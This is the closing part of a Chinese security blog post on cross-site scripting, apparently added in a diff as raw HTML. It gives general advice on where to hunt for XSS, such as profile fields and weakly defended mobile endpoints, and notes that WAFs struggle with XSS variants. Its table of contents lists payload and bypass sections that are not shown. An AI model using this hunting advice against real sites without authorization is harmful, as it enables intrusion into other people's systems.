+<h2 id="XSS的总结"><a href="#XSS的总结" class="headerlink" title="XSS的总结"></a>XSS的总结</h2><p>首先先要了解该网站的业务，判断哪些地方可能存在<code>XSS</code>漏洞，比如：发布文章、设置头像、地址、昵称、用户的其它个人资料等，大部分企业都有<code>WEB端</code>和<code>移动端</code>，有些<code>移动端</code>修改的资料，可以显示在<code>WEB端</code>某个地方且目前<code>移动端</code>的<code>XSS</code>防御较弱，我的好多<code>XSS</code>也都是从<code>移动端</code>入手的，<code>XSS</code>也是目前<code>WAF</code>较难防御的一个点，因为可以有太多变形，<code>WAF</code>过滤起来是有一定难度的。</p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84Payload"><span class="toc-number">2.</span> <span class="toc-text">常用的Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF"><span class="toc-number">3.</span> <span class="toc-text">Bypass的一些姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%AE%9E%E4%BE%8B%E5%8F%8A%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">XSS实例及挖掘方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E6%9F%90%E7%A7%9F%E5%8F%B7%E5%B9%B3%E5%8F%B0%E7%9A%84%E4%B8%89%E4%B8%AAXSS"><span class="toc-number">4.1.</span> <span class="toc-text">1.1 某租号平台的三个XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E6%9F%90%E9%99%AA%E7%8E%A9%E5%B9%B3%E5%8F%B0%E7%9A%84%E4%B8%80%E4%B8%AAXSS"><span class="toc-number">4.2.</span> <span class="toc-text">1.2 某陪玩平台的一个XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E6%9F%90%E9%85%92%E5%BA%97%E7%9A%84%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%B0%84XSS"><span class="toc-number">4.3.</span> <span class="toc-text">1.3 某酒店的一个反射XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-bilibili%E6%9F%90%E8%AE%BA%E5%9D%9B%E7%9A%84%E4%B8%80%E4%B8%AAXSS%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">4.4.</span> <span class="toc-text">1.4 bilibili某论坛的一个XSS利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E6%9F%90%E6%97%85%E8%A1%8C%E7%BD%91%E7%9A%84%E4%B8%80%E4%B8%AAXSS"><span class="toc-number">4.5.</span> <span class="toc-text">1.5 某旅行网的一个XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-APP%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3%E4%B8%AD%E7%9A%84XSS"><span class="toc-number">4.6.</span> <span class="toc-text">1.6 APP数据接口中的XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7-XSS%E7%BB%95WAF%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%AE%9E%E4%BE%8B"><span class="toc-number">4.7.</span> <span class="toc-text">1.7 XSS绕WAF的两个实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9A%84%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">XSS的总结</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="搜索"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1665474214488"></script>
+
+
+
+</body>
+
+</html>
